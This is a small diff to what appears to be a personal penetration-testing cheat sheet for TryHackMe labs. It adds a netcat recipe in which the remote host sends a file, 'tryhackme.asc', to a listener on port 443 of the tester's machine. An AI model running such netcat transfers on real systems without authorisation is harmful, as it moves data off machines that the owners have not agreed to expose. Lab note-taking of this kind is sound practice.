@@ -41,6 +41,12 @@ OUPUT:
 [tmux]
     tmux -S default attach
 
+## Transferring file using Netcat:
+- on the remote host 
+    nc 10.8.56.2 443 < tryhackme.asc
+- on the local host
+    sudo nc -lvnp 443 > tryhackme.asc
+
 
 
 
